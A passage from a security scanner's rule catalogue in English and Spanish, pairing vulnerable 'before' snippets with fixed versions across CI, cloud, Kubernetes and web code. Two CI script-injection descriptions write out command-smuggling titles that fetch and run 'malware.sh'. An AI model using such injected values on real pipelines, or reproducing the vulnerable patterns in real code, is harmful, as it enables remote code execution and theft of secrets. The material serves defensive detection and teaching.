      description: 'A "script:" line (or "before_script:"/"after_script:") uses "eval" or "sh -c"/"bash -c" together with a predefined GitLab variable such as the merge request title, the commit message, or the branch name — all writable by anyone who opens a merge request, even from an external fork. The value gets expanded once by the outer shell and then pasted into a string that the second shell parses again as code: a title like "$(curl malware.sh | sh)" would run arbitrary commands in the pipeline, with access to every secret available in that job.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # passed as an argument to the command, never inside a "bash -c" string that would re-parse it`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'Docker-in-Docker in the GitLab CI pipeline runs with TLS encryption disabled',
      description: 'The job uses the "docker:dind" service (Docker-in-Docker, needed to build images inside the pipeline) but sets "DOCKER_TLS_CERTDIR" to an empty string, disabling TLS encryption between the Docker client and the dind daemon entirely. Without TLS, anyone who can reach that port on the runner\'s internal network can control the Docker daemon — which runs with extended privileges — instead of being limited to the job that\'s meant to use it.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # TLS stays on between the Docker client and the dind daemon — "" disables it entirely`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'The GitLab CI pipeline\'s Docker image isn\'t pinned to a specific version',
      description: 'An "image:" in the pipeline points to an image with no tag (which defaults to ":latest") or explicitly to ":latest". Whoever maintains that image can replace its contents at any time without the repository changing — the same pipeline can start running different code from one day to the next, a supply-chain risk conceptually identical to a GitHub Action referenced by tag instead of by commit.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # a specific tag (or even better a digest "node@sha256:...") instead of "latest"`,
      },
    },
  },
  es: {
  "supabase-service-role-in-client": {
    title: "La clave secreta de Supabase termina en una parte pensada para el navegador",
    description:
      "Una variable con prefijo público (p. ej. NEXT_PUBLIC_, VITE_) o un archivo del lado del cliente hace referencia a la service role key de Supabase. Esta clave evita la Row Level Security: si termina en el bundle del navegador, cualquiera puede leerla y actuar como administrador de la base de datos.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (solo servidor)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Hay contraseñas o claves secretas escritas directamente en el código",
    description:
      "Una clave API, un token o una contraseña parecen escritos como valor literal en vez de leerse de una variable de entorno. Cualquiera que lea el código fuente (o el repositorio, si es público) obtiene ese secreto.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "Un archivo con las contraseñas reales del proyecto está entre los analizados",
    description:
      "Un archivo .env con valores reales (no un .env.example) está incluido en el análisis. Si este archivo termina en un repositorio o en un despliegue público, todas las credenciales que contiene quedan expuestas.",
    fix: {
      before: `# .env (subido por error)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (subido)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env se queda fuera del repo (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Cualquiera puede leer o modificar los datos de todos los usuarios",
    description:
      "La Row Level Security está desactivada, o una policy permite el acceso a cualquiera (USING (true)) sin comprobar quién hace la solicitud. Cualquier usuario autenticado — o incluso anónimo — puede leer o modificar los datos de todos los demás.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Un valor introducido por el usuario se pega directamente en una consulta a la base de datos",
    description:
      "Una consulta SQL se construye concatenando o interpolando directamente una cadena en vez de usar parámetros. Si ese texto llega (aunque sea indirectamente) de un usuario, puede alterar la propia consulta — inyección SQL.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Las contraseñas no parecen estar protegidas",
    description:
      "Un campo de contraseña se guarda tal cual llegó en la solicitud, y en el archivo no aparece ninguna función de hashing (bcrypt, argon2, scrypt). Si la base de datos se ve comprometida, todas las contraseñas son utilizables de inmediato.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "El secreto usado para firmar los accesos está escrito en claro en el código",
    description:
      "El secreto que se pasa a jwt.sign / jwt.verify (o la variable JWT_SECRET) es un valor literal en el código en vez de venir de una variable de entorno. Cualquiera que lo lea puede crear tokens de acceso válidos para cualquier usuario.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "El servidor puede ser obligado a ejecutar comandos externos",
    description:
      "Una función que ejecuta comandos del sistema (exec, execSync, spawn) recibe una cadena construida por interpolación o concatenación. Si una parte de esa cadena llega de la entrada del usuario, quien la controla puede hacer que se ejecuten comandos arbitrarios en el servidor.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "Se puede leer o escribir un archivo del servidor eligiendo la ruta desde fuera",
    description:
      "Una función que lee, escribe o envía un archivo obtiene la ruta directamente de un valor de la solicitud (query, body, params) sin comprobar que se mantenga dentro de una carpeta permitida. Un atacante puede insertar \"../\" para salir de la carpeta prevista y leer o sobrescribir archivos arbitrarios del servidor (p. ej. un archivo de configuración con credenciales).",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Ruta no permitida")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Un valor introducido por el usuario se ejecuta como código dentro de una consulta de MongoDB",
    description:
      "El operador $where de MongoDB ejecuta JavaScript del lado del servidor para cada documento — si esa cadena se construye concatenando un valor que llega del usuario, quien lo controla puede hacer que se ejecute código arbitrario en el contexto de la base de datos, no solo alterar el filtro como con una inyección SQL normal.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Un valor introducido por el usuario se interpreta como una plantilla, no como un dato",
    description:
      "Una función que compila/ejecuta una plantilla recibe la plantilla ENTERA de un valor de la solicitud, en vez de usar una plantilla fija y pasar solo los datos. Un atacante puede escribir directamente en la sintaxis del motor de plantillas (p. ej. {{7*7}} para Jinja2) y ejecutar código en el servidor — Server-Side Template Injection, que a menudo lleva a ejecución de comandos arbitrarios, no solo a un problema de visualización como el XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "El parser XML puede ser obligado a leer archivos o hacer solicitudes externas",
    description:
      "Un parser XML (DocumentBuilderFactory) se crea sin desactivar explícitamente las entidades externas (DOCTYPE) en las líneas cercanas. Si el parser recibe XML de una fuente no confiable, un atacante puede definir una entidad externa para leer archivos del servidor o hacer que contacte una dirección de su elección — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Un secreto está escrito directamente en una instrucción ENV o ARG del Dockerfile",
    description:
      "Una variable con un nombre tipo password/secret/token/key tiene un valor literal en una instrucción ENV o ARG. A diferencia de un .env (que normalmente no termina en la imagen), este valor queda incorporado en la propia imagen Docker — cualquiera que pueda hacer pull o inspeccionar el historial de capas lo recupera, aunque la línea se elimine en una versión posterior del Dockerfile.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# pasado con: docker build --build-arg DB_PASSWORD=*** (o, mejor aún,\n# con un secret mount de BuildKit, que nunca termina en el historial de capas)`,
    },
  },
  "k8s-privileged-container": {
    title: "Un contenedor del manifiesto de Kubernetes se ejecuta como privileged",
    description:
      '"privileged: true" en el securityContext de un contenedor desactiva casi todo el aislamiento habitual entre contenedor y host: el contenedor puede acceder a los dispositivos del host, cambiar su configuración de red y, en muchos casos, obtener de hecho acceso root en la máquina que lo ejecuta. Casi nunca es necesario para una app normal.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # solo las capabilities realmente necesarias`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Un secreto está escrito en claro en una variable env del manifiesto de Kubernetes",
    description:
      'Una variable de entorno con un nombre tipo password/secret/token/key tiene un valor literal ("value:") en vez de leerse de un Secret ("valueFrom.secretKeyRef"). El manifiesto en sí — a menudo subido a un repositorio — contiene entonces el secreto en claro, visible incluso para quien solo puede leer la configuración, no necesariamente ejecutar comandos en el clúster.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "terraform-open-security-group": {
    title: "Un security group de Terraform abre un puerto sensible a todo internet",
    description:
      'Una regla con "cidr_blocks" que incluye 0.0.0.0/0 (cualquier dirección IP) está cerca de un puerto sensible — SSH (22), RDP (3389), o un puerto típico de base de datos (MySQL, Postgres, MongoDB, Redis, SQL Server). Cualquiera en internet puede intentar conectarse a ese servicio, no solo quien debería.',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # solo tu red privada, o un bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Una regla de firewall de Google Cloud abre un puerto sensible a todo internet",
    description:
      'Un recurso "google_compute_firewall" con "source_ranges" que incluye 0.0.0.0/0 (cualquier dirección IP) permite tráfico hacia un puerto sensible — SSH (22), RDP (3389), o un puerto típico de base de datos (MySQL, Postgres, MongoDB, Redis, SQL Server). Cualquiera en internet puede intentar conectarse a ese servicio, no solo quien debería.',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # solo tu red privada, o un bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Una regla de red de Azure abre un puerto sensible a todo internet",
    description:
      'Una regla de seguridad de red ("azurerm_network_security_rule", o un bloque "security_rule" dentro de "azurerm_network_security_group") con "source_address_prefix" en "*" o "0.0.0.0/0", dirección "Inbound" y acceso "Allow", cerca de un puerto sensible — SSH (22), RDP (3389), o un puerto típico de base de datos. Cualquiera en internet puede intentar conectarse a ese servicio, no solo quien debería.',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # solo tu red privada, o un bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Un secreto está escrito como valor por defecto de una variable de Terraform",
    description:
      'Una variable con un nombre tipo password/secret/token/key tiene un valor literal en su "default". A diferencia de un valor pasado en tiempo de ejecución (tfvars, variables de entorno TF_VAR_*), un default termina en el código fuente — y si el repositorio es compartido o público, cualquiera lo ve, incluso sin acceso al estado de Terraform.',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # sin default: debe pasarse con un archivo .tfvars (fuera de git) o una variable de entorno TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Un valor controlado por un usuario externo entra directamente en un comando de shell de la CI",
    description:
      'Un comando "run:" de un workflow de GitHub Actions interpola directamente un valor como el título de una pull request, el nombre de una rama o el texto de un comentario — todos escribibles por cualquiera que abra una pull request o un comentario, incluso desde un fork externo. Un valor como `"; curl malware.sh | sh #` ejecutaría comandos arbitrarios en la CI, con acceso a todos los secretos disponibles en ese workflow.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # pasado como variable de entorno, nunca interpolado directamente en el comando`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "El workflow ejecuta el código de una pull request externa con acceso a los secretos del repositorio",
    description:
      'El workflow usa "pull_request_target" — que se ejecuta con los permisos y los secretos del repositorio base incluso para una pull request abierta desde un fork ajeno — y hace el checkout del propio código de la pull request ("github.event.pull_request.head"), no de la rama base. Quien abre la pull request consigue de hecho que su propio código se ejecute con acceso a esos secretos.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Hace el checkout de la rama base, no del código de la PR — o bien usa\n      # "pull_request" en vez de "pull_request_target" si no necesitas\n      # los permisos/secretos más amplios.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Los datos de la solicitud se deserializan con un formato que puede ejecutar código",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) o la librería node-serialize (Node) están deserializando un valor tomado directamente de la solicitud. A diferencia de JSON, estos formatos pueden representar y ejecutar código durante la propia deserialización — quien controla el valor enviado puede lograr ejecución de código arbitrario en el servidor.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON nunca ejecuta código al analizar, a diferencia de pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'El código acepta explícitamente tokens JWT sin firmar (algoritmo "none")',
    description:
      '"none" aparece entre los algoritmos aceptados para verificar un token JWT. Un token con el algoritmo "none" no tiene ninguna firma que verificar: cualquiera puede construir uno con cualquier contenido (p. ej. un rol de administrador) y el código lo aceptaría como válido.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // nunca incluir "none" entre los algoritmos aceptados`,
    },
  },
  "unprotected-new-table": {
    title: "Parece que se ha creado una tabla nueva sin protección",
    description:
      "Una migración SQL crea una tabla pero no activa la Row Level Security para esa misma tabla en el mismo archivo. Mientras siga así, la tabla nace sin ninguna restricción sobre quién puede leerla o escribirla.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "El sitio acepta solicitudes de cualquier otro sitio web",
    description:
      "La cabecera CORS está configurada para aceptar solicitudes de cualquier origen (*), o el middleware cors() se usa sin restricciones. Cualquier sitio web de terceros puede llamar a tus API desde el navegador de un usuario ya autenticado.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://tusitio.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Una función con permisos de administrador no comprueba quién la usa",
    description:
      "Una ruta o función cuyo nombre sugiere operaciones de administrador no contiene, en las líneas cercanas, ningún control de autenticación o de rol. Cualquiera que conozca la URL podría ejecutarla.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "El sitio puede ser obligado a ejecutar código externo",
    description:
      "Una solicitud HTTP saliente (fetch, axios) usa directamente un valor que llega de la solicitud de un usuario como URL de destino. Un usuario malintencionado puede hacer que tu servidor llame a direcciones internas o arbitrarias — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.tuservicio.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL no permitida")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Las contraseñas están protegidas con un método que ya es fácil de romper",
    description:
      "En la misma línea, se aplican md5() o sha1() a un valor ligado a una contraseña. Estos algoritmos son demasiado rápidos de calcular: un atacante con la base de datos puede probar miles de millones de contraseñas por segundo.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "k8s-run-as-root": {
    title: "Un contenedor del manifiesto de Kubernetes está configurado para ejecutarse como root",
    description:
      '"runAsUser: 0" o "runAsNonRoot: false" en el securityContext fuerzan explícitamente la ejecución como root dentro del contenedor. Si un atacante logra ejecutar código en el contenedor (p. ej. explotando una librería vulnerable), ser root dentro del contenedor facilita una posible fuga hacia el host o un impacto más amplio.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Un contenedor del manifiesto de Kubernetes puede obtener más privilegios de los iniciales",
    description:
      '"allowPrivilegeEscalation: true" en el securityContext permite que un proceso dentro del contenedor obtenga más privilegios que el proceso que lo inició (p. ej. mediante un binario con setuid). Combinado con una vulnerabilidad en la aplicación, es un paso más hacia la ejecución de código con más privilegios de los previstos.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Un pod del manifiesto de Kubernetes comparte la red, los procesos o la memoria compartida del host",
    description:
      '"hostNetwork", "hostPID" o "hostIPC" puestos a true sacan al pod de su aislamiento normal: hostNetwork expone el pod en la red del host (evitando las políticas de red del clúster), hostPID le da visibilidad sobre todos los procesos de la máquina host, hostIPC le da acceso a la memoria compartida del host. Casi nunca es necesario para una app normal — típico solo de herramientas de sistema/monitorización de bajo nivel.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access está desactivado en un bucket S3 definido en Terraform",
    description:
      'Una o más de las cuatro protecciones de "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) están puestas en false. No significa que el bucket ya sea público, pero quita una red de seguridad que impediría hacerlo público por error en el futuro.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Una policy de IAM definida en Terraform concede acceso completo",
    description:
      'Un statement con acción "*" y recurso "*" concede acceso completo a todos los servicios y recursos de AWS — el mismo control que ya se hace sobre el estado IAM en vivo, aquí leído directamente del código antes incluso de aplicarse. Puede ser intencional para un rol de emergencia, pero debe confirmarse: para el uso cotidiano, concede solo los permisos realmente necesarios.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::tu-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Un bucket de Google Cloud Storage queda legible por cualquiera",
    description:
      'Un recurso "google_storage_bucket_iam_member" o "google_storage_bucket_iam_binding" concede un rol a "allUsers" o "allAuthenticatedUsers" — el primero hace el bucket legible por cualquiera en internet, incluso sin cuenta de Google; el segundo por cualquiera que tenga cualquier cuenta de Google, no solo quien debería tener acceso.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:alguien@example.com"  # solo quien de verdad deba tener acceso, no allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "El acceso público a los blobs está habilitado en una cuenta de almacenamiento de Azure",
    description:
      '"allow_blob_public_access" está puesto en true en una "azurerm_storage_account": cualquiera que conozca la URL de un blob/contenedor hecho público puede leerlo, sin ninguna autenticación.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Un rol de IAM de Google Cloud concede acceso completo (Owner/Editor)",
    description:
      'Un "google_project_iam_binding"/"google_project_iam_member" (o el equivalente a nivel de organización/carpeta) asigna el rol primitivo "roles/owner" o "roles/editor" — acceso casi completo a todos los servicios del proyecto. Puede ser intencional para una cuenta de emergencia, pero debe confirmarse: para el uso cotidiano, concede solo los roles predefinidos más específicos que de verdad se necesiten.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # solo el rol predefinido que de verdad se necesita, no roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Una asignación de rol de Azure concede acceso completo (Owner)",
    description:
      'Un "azurerm_role_assignment" asigna el rol "Owner" — acceso completo, incluyendo el control sobre los permisos de otros usuarios, en todo el scope asignado (suscripción, grupo de recursos...). Puede ser intencional para una cuenta de emergencia, pero debe confirmarse: para el uso cotidiano, concede solo el rol más específico que de verdad se necesite (p. ej. "Contributor" en un único grupo de recursos).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # solo el rol más específico que de verdad se necesita, no Owner en toda la suscripción\n}`,
    },
  },
  "weak-random-token": {
    title: "Un token de seguridad se genera con un generador de números aleatorios no criptográficamente seguro",
    description:
      "Un valor con un nombre tipo token/session/reset/otp/csrf se genera con Math.random() (JS), random.random() (Python) o rand() (PHP) — generadores no pensados para la seguridad, cuyas secuencias son predecibles. Un token generado así puede adivinarse o reconstruirse, anulando el propósito para el que existe (p. ej. un enlace de restablecimiento de contraseña que cualquiera podría predecir).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, no Math.random — impredecible`,
    },
  },
  "ldap-injection": {
    title: "Un filtro LDAP se construye concatenando directamente un valor de la solicitud",
    description:
      'Una línea que construye un filtro LDAP (p. ej. "(uid=...)") incluye directamente un valor tomado de la solicitud, sin ningún escape de los caracteres especiales de LDAP. Quien controla ese valor puede alterar la lógica del filtro — por ejemplo, evitar un control de autenticación o leer datos del directorio que no debería ver.',
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after:
        "const filter = `(uid=${ldapEscape(req.body.username)})`; // los caracteres especiales de LDAP siempre deben escaparse antes de usarlos en un filtro\nclient.search(base, { filter });",
    },
  },
  "xss-dangerous-html": {
    title: "Un texto escrito por los usuarios podría ejecutar código en el navegador",
    description:
      "Se inserta contenido en la página como HTML en bruto (dangerouslySetInnerHTML, v-html, .innerHTML) en vez de como texto plano. Si ese contenido incluye entrada de un usuario, puede contener scripts que se ejecuten en el navegador de quien lea la página.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// o, si se necesita HTML: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "El espacio de los archivos subidos es visible para cualquiera",
    description:
      "Un bucket de almacenamiento (Supabase Storage, S3) está configurado como público. Si contiene documentos, fotos o archivos subidos por los usuarios, cualquiera que conozca — o adivine — la ruta puede acceder a ellos sin autenticación.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// servir los archivos con URLs firmadas y de duración limitada: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Basta un enlace para borrar o cambiar datos",
    description:
      "Una ruta GET realiza una operación que cambia datos (la ruta contiene delete/remove/update/edit). Las solicitudes GET se ejecutan con solo visitar un enlace o cargar una imagen desde un sitio externo — el punto de apoyo clásico para un ataque CSRF.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Los datos de acceso guardados en el navegador no están bien protegidos",
    description:
      "Un token de acceso se guarda en localStorage. A diferencia de una cookie httpOnly, cualquier script que se ejecute en la página (incluido uno malicioso inyectado vía XSS) puede leerlo y robarlo.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// establecer el token como cookie httpOnly desde el servidor:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "El sitio puede usarse para redirigir a un sitio fraudulento",
    description:
      "El sitio redirige al usuario a una dirección tomada directamente de la solicitud (query, body, params) sin comprobar que sea un dominio conocido. Un enlace que parece apuntar a tu sitio puede en realidad llevar a una página de phishing.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Cambiar un número en la dirección podría mostrar datos de otra persona",
    description:
      "Una consulta a la base de datos usa directamente un identificador tomado de la URL (req.params.id) sin comprobar, en las líneas cercanas, que pertenezca al usuario que hace la solicitud. Cambiar el id en la dirección podría dar acceso a los datos de otro usuario — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "header-injection": {
    title: "Un valor de la solicitud termina directamente en una cabecera HTTP de respuesta",
    description:
      "Una cabecera HTTP de respuesta se establece con un valor tomado directamente de la solicitud (query, body, params), sin comprobar que no contenga un salto de línea (CRLF). Un atacante puede insertar cabeceras adicionales o incluso una respuesta completamente distinta — response splitting — pudiendo manipular la caché, las cookies o el contenido mostrado a otros usuarios.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "El Dockerfile no establece un usuario no root",
    description:
      "No hay instrucción USER en el Dockerfile: sin especificarla, el contenedor se ejecuta como root. Si un atacante logra ejecutar código dentro del contenedor (p. ej. explotando una librería vulnerable), ser root dentro del contenedor facilita una posible fuga hacia el host o un impacto más amplio sobre el sistema circundante.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "El manifiesto de Kubernetes no impone explícitamente la ejecución como usuario no root",
    description:
      'No hay "runAsNonRoot" en ningún sitio del manifiesto (ni a nivel de pod ni de contenedor): sin establecerlo, un contenedor se ejecuta como el usuario que defina su imagen — a menudo root por defecto, si la propia imagen no lo ha cambiado. Establecerlo explícitamente en true hace que el pod falle al iniciar si la imagen igualmente intenta ejecutarse como root, en vez de descubrirlo solo después de un incidente.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "Una acción de terceros en la CI no está fijada a una versión precisa (commit SHA)",
    description:
